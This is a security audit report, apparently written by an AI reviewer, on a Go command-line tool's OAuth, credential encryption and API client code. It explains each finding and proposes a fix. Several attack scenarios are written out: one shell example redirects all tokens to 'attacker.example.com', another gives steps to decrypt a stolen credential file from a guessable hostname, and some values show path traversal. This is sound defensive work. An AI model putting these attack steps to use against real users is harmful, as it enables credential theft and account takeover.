# Security Review — myn-cli feature-cli-1

**Date:** 2026-03-09
**Reviewer:** Security Agent
**Branch:** feature-cli-1
**Files reviewed:** 18 Go source files across `cmd/`, `internal/`, and `test/`

---

## Summary

**3 HIGH**, **5 MEDIUM**, **6 LOW/INFO** findings.
No CRITICAL vulnerabilities found. The codebase demonstrates solid security fundamentals: correct PKCE implementation using `crypto/rand`, AES-GCM encryption at rest, proper file permissions (0700/0600), mutex-protected token field, and state parameter CSRF validation. The main risk surface is the weakness of the machine-derived encryption key and several patterns in the integration test layer.

---

## HIGH Findings

### HIGH-1 — Weak, predictable encryption key derivation (fallback path)

**Severity:** HIGH
**File:** `internal/auth/keyring.go:172–194`
**OWASP:** A02:2021 — Cryptographic Failures

**Description:**
`machineSecret()` derives the PBKDF2 password from the `/etc/machine-id` file (good), but falls back to `sha256(hostname + "|myn-cli-v1")` when machine-id is unavailable. The static suffix `"|myn-cli-v1"` is a known, public constant (it is in the open-source repo). On systems where `/etc/machine-id` is absent or empty (containers, some minimal Linux installs, macOS), the entire encryption strength reduces to the entropy of the system hostname.

Hostnames are often predictable or publicly discoverable (e.g., `ubuntu`, `localhost`, `user-laptop`). An attacker who obtains the encrypted credential file (via backup theft, shared NAS, cloud sync leak) can enumerate common hostnames offline at minimal cost against the AES-GCM ciphertext, because AES-GCM authentication will reject wrong keys deterministically.

Additionally, the code does **not** check the macOS case at all — on macOS the machine-id paths (`/etc/machine-id`, `/var/lib/dbus/machine-id`) do not exist, so every macOS user falls into the weak hostname fallback.

**Attack scenario:**
1. Attacker obtains `~/.config/mynow/credentials/refresh_token.enc` (e.g., from a leaked dotfiles backup).
2. They know the victim's hostname from LinkedIn profile ("John's MacBook Pro") or DNS.
3. They compute `sha256("johns-macbook-pro|myn-cli-v1")`, use it as PBKDF2 input with the stored salt, derive the AES key, and decrypt the refresh token in seconds.
4. The refresh token grants indefinite API access.

**Impact:** Full account takeover if the credential file is exfiltrated. Refresh tokens are long-lived.

**Recommendation:**
- Add macOS support: read `/var/db/SystemConfiguration/preferences.plist` or use `IOPlatformSerialNumber` via `system_profiler`.
- As a universal fallback, generate a random 256-bit key on first run and store it in the OS keychain (Secret Service on Linux via `github.com/zalando/go-keyring` or similar), falling back to a separate randomly-generated file with 0600 permissions.
- At minimum, if the hostname fallback is kept, log a warning to the user that credential protection is degraded.

---

### HIGH-2 — Hardcoded JWT secret and demo API key in version-controlled Docker Compose

**Severity:** HIGH
**File:** `test/integration/docker-compose.yml:43–44`
**OWASP:** A07:2021 — Identification and Authentication Failures / A05:2021 — Security Misconfiguration

**Description:**
The integration test `docker-compose.yml` hardcodes two secrets:

```yaml
JWT_SECRET: dGVzdC1zZWNyZXQta2V5LWZvci1pbnRlZ3JhdGlvbi10ZXN0cw==
DEMO_API_KEY: test_demo_key
```

`dGVzdC1zZWNyZXQta2V5LWZvci1pbnRlZ3JhdGlvbi10ZXN0cw==` decodes to `test-secret-key-for-integration-tests`, a short, low-entropy string. These values are permanently recorded in git history.

The risk is compounded by the integration test at `test/integration/demo_account_test.go:22`, which hard-codes the same `test_demo_key` and assumes the `DEMO_API_KEY` environment variable matches. If a developer or CI pipeline accidentally points `MYN_TEST_BACKEND_URL` at a staging or production server (not an unreasonable mistake), the `recreate-account` endpoint gets called with a key that may be reused in non-test environments.

**Attack scenario:**
1. `test_demo_key` is committed to the public open-source repo.
2. A developer copies the docker-compose to a staging environment and forgets to override `DEMO_API_KEY`.
3. Any visitor who reads the GitHub repo can call `POST /api/v1/admin/demo/recreate-account` with `X-Demo-API-Key: test_demo_key` against staging, wiping and re-creating a demo account.

**Impact:** In staging/production environments: data destruction, account takeover of the demo account, potential for privilege escalation if the demo account has elevated permissions.

**Recommendation:**
- Rotate the JWT secret in the compose file to a randomly-generated value (it only needs to be consistent within a test run, not predictable).
- Load `DEMO_API_KEY` from an environment variable with no default in `docker-compose.yml`: `DEMO_API_KEY: ${MYN_TEST_DEMO_KEY:?MYN_TEST_DEMO_KEY must be set}`.
- Add a `docker-compose.yml` secret-scanning rule to CI (e.g., `truffleHog`, `gitleaks`).

---

### HIGH-3 — Unvalidated `MYN_API_URL` allows trivial redirect of all requests to attacker server

**Severity:** HIGH
**File:** `internal/config/config.go:28–31`
**OWASP:** A10:2021 — Server-Side Request Forgery (SSRF) / A05:2021 — Security Misconfiguration

**Description:**
The `MYN_API_URL` environment variable is accepted verbatim with no validation — no scheme check (requires `https://`), no hostname allow-list, and no URL structure validation:

```go
baseURL := os.Getenv("MYN_API_URL")
if baseURL == "" {
    baseURL = DefaultBaseURL
}
```

Any process on the machine that can set environment variables before the CLI runs (e.g., a shell profile hijack, a malicious shell script in the project directory, or a compromised CI environment) can redirect all API traffic — including the OAuth flow and Bearer token transmission — to an arbitrary server.

This is especially dangerous because:
1. The OAuth callback server makes HTTP requests to the configured `BaseURL` for token exchange (`/oauth/token`). A malicious server receives the authorization code and code verifier.
2. All subsequent API requests carrying the `Authorization: Bearer <token>` header go to the attacker's server.
3. The HTTP client does **not** enforce HTTPS (no scheme check), so the attacker can use a plain HTTP endpoint to MitM without triggering TLS warnings.

**Attack scenario:**
```bash
# In a compromised CI environment or shell profile:
export MYN_API_URL=http://attacker.example.com
mynow login
# All OAuth traffic + all API calls go to attacker, including the access token
```

**Impact:** Complete credential theft via environment variable manipulation in any environment where the CLI is run without strict env isolation.

**Recommendation:**
Validate the URL at load time:
```go
u, err := url.Parse(baseURL)
if err != nil || (u.Scheme != "https" && u.Scheme != "http") {
    return nil, fmt.Errorf("MYN_API_URL must be a valid http(s) URL")
}
// In production builds, enforce https only:
if u.Scheme != "https" {
    return nil, fmt.Errorf("MYN_API_URL must use HTTPS")
}
```
Consider allowing `http://localhost` only for development/testing.

---

## MEDIUM Findings

### MEDIUM-1 — OAuth callback server has no request timeout (DoS / resource exhaustion)

**Severity:** MEDIUM
**File:** `internal/auth/oauth.go:256–258`
**OWASP:** A05:2021 — Security Misconfiguration

**Description:**
The `http.Server` created for the OAuth callback has no `ReadTimeout`, `WriteTimeout`, or `IdleTimeout`:

```go
server := &http.Server{
    Handler: mux,
}
```

An attacker on localhost (or any process on the machine) can open a connection to the callback port and hold it open with a slow HTTP request (Slowloris-style). While this is a local server, on multi-user systems or in shared environments (containers, CI) this matters. More practically, a misbehaving browser or proxy could leave the goroutine hanging indefinitely, preventing the CLI from receiving a valid callback.

The outer `Authenticate()` function does respect the parent context (via the `select` on `ctx.Done()`), but the server goroutine itself has no deadline.

**Recommendation:**
```go
server := &http.Server{
    Handler:      mux,
    ReadTimeout:  30 * time.Second,
    WriteTimeout: 30 * time.Second,
    IdleTimeout:  60 * time.Second,
}
```

---

### MEDIUM-2 — OAuth callback server binds to all interfaces, not just loopback

**Severity:** MEDIUM
**File:** `internal/auth/oauth.go:81`
**OWASP:** A01:2021 — Broken Access Control

**Description:**
The listener is created with:
```go
listener, err := net.Listen("tcp", "localhost:0")
```

This correctly specifies `localhost`, but only on systems where `localhost` resolves to `127.0.0.1`. On systems with `::1` as the default `localhost` (IPv6 only), or on systems where `/etc/hosts` has been tampered with to point `localhost` to a non-loopback address, this could result in the callback server being reachable from the network.

More directly: the string `"localhost:0"` causes Go's `net.Listen` to resolve `localhost` using the system resolver. If `localhost` resolves to `0.0.0.0` due to misconfiguration or `/etc/hosts` manipulation, the OAuth callback server — which accepts authorization codes — becomes network-accessible.

**Recommendation:**
Bind explicitly to the loopback address:
```go
listener, err := net.Listen("tcp", "127.0.0.1:0")
```
This is unambiguous and not subject to name resolution.

---

### MEDIUM-3 — Authorization code is logged in plaintext to stderr on callback server error

**Severity:** MEDIUM
**File:** `internal/auth/oauth.go:265–268`
**OWASP:** A09:2021 — Security Logging and Monitoring Failures / A02:2021 — Cryptographic Failures

**Description:**
When the `error` parameter is present in the OAuth callback, the raw error string from the authorization server is logged to stderr via the error channel. More critically, the `error_description` parameter (if present from the server) would also be echoed. While not the authorization code itself, a related concern is that the full callback URL — including the `code` parameter — is visible in any browser history or system-level request logging. The OAuth code has a very short window, but if the token exchange fails, the code remains in logs.

Additionally, at `oauth.go:114`:
```go
fmt.Printf("Opening browser for authentication:\n%s\n", authURL)
```
The full authorization URL is printed to stdout. This URL contains the `state` parameter and `code_challenge`. While neither is directly a secret (the verifier is never printed), in a piped or logged shell session this URL ends up in logs.

The more serious issue is that the `error` parameter value from the OAuth server callback (`errorParam` at line 263) is passed directly into an error message and transmitted through the channel without sanitization. If a malicious redirect were to occur (see HIGH-3), the error string could be attacker-controlled and could contain terminal escape codes (ANSI injection).

**Recommendation:**
- Sanitize the `errorParam` value before including it in error messages: strip non-printable characters.
- Consider printing the auth URL only when a `--verbose` flag is passed; by default print just "Opening browser for authentication..." without the URL.

---

### MEDIUM-4 — Retry-After header DoS: server controls sleep duration with no cap

**Severity:** MEDIUM
**File:** `internal/api/client.go:186–195`
**OWASP:** A05:2021 — Security Misconfiguration

**Description:**
The 429 rate-limit handler reads the `Retry-After` header and sleeps for that many seconds with no upper bound:

```go
var seconds int
if _, err := fmt.Sscanf(retryAfter, "%d", &seconds); err == nil {
    select {
    case <-ctx.Done():
        return nil, ctx.Err()
    case <-time.After(time.Duration(seconds) * time.Second):
        continue
    }
}
```

A malicious or compromised backend (see HIGH-3: `MYN_API_URL` redirect) can return `Retry-After: 2147483647` and the CLI goroutine will sleep for ~68 years. While the parent context can cancel this, in typical usage no outer deadline is set, leaving the process hanging until the user kills it.

**Recommendation:**
Cap the `Retry-After` to a reasonable maximum (e.g., 60 seconds):
```go
if seconds > 60 {
    seconds = 60
}
```

---

### MEDIUM-5 — Integration test transmits demo API key over plain HTTP; no TLS in test stack

**Severity:** MEDIUM
**File:** `test/integration/demo_account_test.go:18–26`
**OWASP:** A02:2021 — Cryptographic Failures

**Description:**
The integration test makes all HTTP requests using `http.DefaultClient` with no TLS configuration, connecting to `http://localhost:17000`. The `DEMO_API_KEY` (`test_demo_key`) and the resulting bearer token are transmitted in plaintext. On a developer workstation this is low risk, but if `MYN_TEST_BACKEND_URL` is set to an HTTPS staging endpoint and the URL is accidentally `http://`, the bearer token flows in plaintext.

More concretely, `http.DefaultClient` follows redirects (up to 10), has no timeout set at the client level (only per-request via context, which is absent here), and does not validate that the backend URL uses HTTPS even when connecting to non-localhost addresses.

**Recommendation:**
- Set a timeout on `http.DefaultClient` or use a custom client in tests.
- Assert that when `MYN_TEST_BACKEND_URL` is set to a non-localhost URL, it uses `https://`.

---

## LOW / INFO Findings

### LOW-1 — `ClientID` and `ClientSecret` are public struct fields (unintentional exposure risk)

**Severity:** LOW
**File:** `internal/auth/oauth.go:37–44`

**Description:**
`OAuthClient.ClientID` and `ClientSecret` are exported fields. In a public client (PKCE flow), `ClientSecret` is always empty, which is correct. However, exported fields can be accidentally serialized (e.g., logged via `%+v` formatting), transmitted in debug output, or accessed by future code that imports the package. Since this is an open-source repo with `internal/` packages, external serialization is not possible, but the pattern is fragile.

**Recommendation:** Make `clientID` and `clientSecret` unexported and expose them only via constructor parameters or getter methods. This also prevents accidental modification from outside the `auth` package.

---

### LOW-2 — `error` messages include raw API response body (potential information leakage in logs)

**Severity:** LOW
**File:** `internal/auth/oauth.go:157`, `internal/auth/oauth.go:332`, `internal/api/client.go:200`, `internal/api/client.go:204`

**Description:**
Error messages include the raw response body from the server:
```go
return nil, fmt.Errorf("token refresh failed: %s - %s", resp.Status, string(body))
return nil, fmt.Errorf("token exchange failed: %s - %s", resp.Status, string(body))
return nil, fmt.Errorf("request failed: %s - %s", resp.Status, string(body))
```

These error values propagate to the `app.go` layer where they are passed to `a.Formatter.Error(fmt.Sprintf("authentication failed: %v", err))` and printed to stdout. If the API returns verbose error payloads containing internal server details, stack traces, or user-identifiable information, this data is printed to the terminal and may end up in shell history files or CI logs.

**Recommendation:** Truncate response bodies in error messages (e.g., max 200 bytes) and consider sanitizing them through the `ParseError()` method rather than embedding raw bytes.

---

### LOW-3 — No response body size limit on API responses

**Severity:** LOW
**File:** `internal/api/client.go:165`

**Description:**
`io.ReadAll(resp.Body)` is called with no size limit:
```go
body, err := io.ReadAll(resp.Body)
```

A malicious or compromised backend can stream a multi-gigabyte response body, causing the CLI process to exhaust memory. While this requires a server-side attacker, combined with the `MYN_API_URL` override issue (HIGH-3) it becomes a trivial local DoS.

**Recommendation:**
```go
body, err := io.ReadAll(io.LimitReader(resp.Body, 10*1024*1024)) // 10MB limit
```

---

### LOW-4 — `PluginEnable` accepts arbitrary plugin names with no path traversal guard

**Severity:** LOW
**File:** `internal/app/app.go:116–118`, `cmd/mynow/main.go:224–230`

**Description:**
The `plugin enable <name>` command accepts a raw plugin name as a CLI argument and passes it directly to `a.PluginEnable(ctx, args[0])`. The `PluginEnable` function is currently a stub, but the plugin directory is `filepath.Join(configDir, "plugins")`. When plugin loading is implemented, if the `name` argument is used to construct a file path without sanitization, a value like `../../.bashrc` or `../../.ssh/authorized_keys` could enable path traversal.

**Recommendation:** When implementing plugin file operations, validate that the resolved plugin path is within the configured `PluginDir` using `filepath.Rel()` or by comparing the absolute path prefix. Reject names containing path separators (`/`, `\`).

---

### LOW-5 — No authentication check before performing authenticated operations in `app.go`

**Severity:** LOW
**File:** `internal/app/app.go` — all command handlers

**Description:**
The command handlers (`InboxList`, `NowList`, `TaskDone`, etc.) do not check whether a valid token exists before making API calls. When the token is absent or expired, the first request will fail with a 401, which the user will see as an opaque error. There is no explicit "are you logged in?" gate with a helpful redirect to `mynow login`.

This is a UX concern with a mild security angle: the CLI may retry on server errors (5xx) but will not retry a 401 with a token refresh, meaning an expired token causes silent request failure with no remediation path presented to the user.

**Recommendation:** On application startup or before first API call, attempt to load the refresh token from the keyring. If absent, print a helpful error directing the user to `mynow login`. If present but the access token is stale, proactively call `RefreshToken`.

---

### LOW-6 — `go.mod` marks `golang.org/x/crypto` as `indirect`; consider making it direct

**Severity:** LOW / INFO
**File:** `go.mod:9`

**Description:**
`golang.org/x/crypto v0.48.0` is marked as `// indirect` even though it is directly imported by `internal/auth/keyring.go` (PBKDF2). This suggests the dependency graph may not be fully tidy (`go mod tidy` not run, or the import is through an indirect path). This does not introduce a vulnerability, but makes dependency auditing harder: automated tools that check for CVEs in direct dependencies only would miss this package.

**Recommendation:** Run `go mod tidy` to ensure `go.mod` accurately reflects direct vs. indirect dependencies. As of the review date, `golang.org/x/crypto v0.48.0` has no known critical CVEs, but this should be checked at release time.

---

## Dependency Vulnerabilities

| Package | Version | Status |
|---|---|---|
| `golang.org/x/crypto` | v0.48.0 | No known CVEs as of 2026-03 |
| `github.com/spf13/cobra` | v1.10.2 | No known CVEs |
| `github.com/spf13/pflag` | v1.0.9 | No known CVEs |

---

## Positive Security Observations

The following security controls are correctly implemented and worth noting:

1. **PKCE with S256**: `generateCodeVerifier()` uses `crypto/rand` (not `math/rand`), generates 128 bytes (well above the 32-byte RFC minimum), and uses SHA-256 for the code challenge. Correct.

2. **State parameter CSRF protection**: State is 32 bytes of `crypto/rand`, validated in the callback handler with a constant-time-like string comparison (Go string `!=` on equal-length random strings is effectively safe here).

3. **AES-GCM with random nonce**: The encryption scheme is modern and correct — random nonce prepended to ciphertext, 32-byte key, authenticated encryption.

4. **File permissions**: Credentials directory created with `0700`, token file written with `0600`. Correct.

5. **Mutex on token field**: `sync.RWMutex` properly protects the `token` field in the API client against concurrent access.

6. **No retry on non-idempotent methods**: POST/PUT/PATCH/DELETE are not retried, preventing duplicate writes.

7. **Context propagation**: All HTTP requests use `http.NewRequestWithContext`, ensuring cancellation is respected throughout.

8. **`SilenceUsage: true`**: Prevents leaking command structure on runtime errors.

9. **Dynamic client registration**: The CLI registers as a public OAuth client (`token_endpoint_auth_method: none`) rather than embedding a client secret. This is the correct approach for CLI tools.

---

## Compliance Considerations

- **GDPR**: The credential file stores an OAuth refresh token tied to a user account. `Keyring.Clear()` (called on logout) correctly removes the token. If the CLI will ever log user activity or email addresses, those logs should be addressed.
- **PKCE RFC 7636**: Implementation is compliant with RFC 7636 (S256 method, 128-byte verifier).
- **OAuth 2.0 Security BCP (RFC 9700)**: The redirect URI is registered dynamically and matches exactly what is sent in the authorization request. The state parameter is validated. PKCE is used for all authorization code grants. These are all correct per the current BCP.

---

## Summary Statistics

| Severity | Count |
|---|---|
| CRITICAL | 0 |
| HIGH | 3 |
| MEDIUM | 5 |
| LOW/INFO | 6 |
| **Total** | **14** |

**Files reviewed:** 18 Go source files
**Lines of code reviewed:** ~1,400

**Priority order for remediation:**
1. HIGH-3 (MYN_API_URL validation) — easy fix, high impact
2. HIGH-1 (machine secret fallback) — moderate effort, high impact on credential safety
3. HIGH-2 (hardcoded compose secrets) — easy fix, public repo exposure risk
4. MEDIUM-2 (explicit loopback bind) — one-line fix
5. MEDIUM-1 (callback server timeouts) — low effort
6. MEDIUM-4 (Retry-After cap) — one-line fix
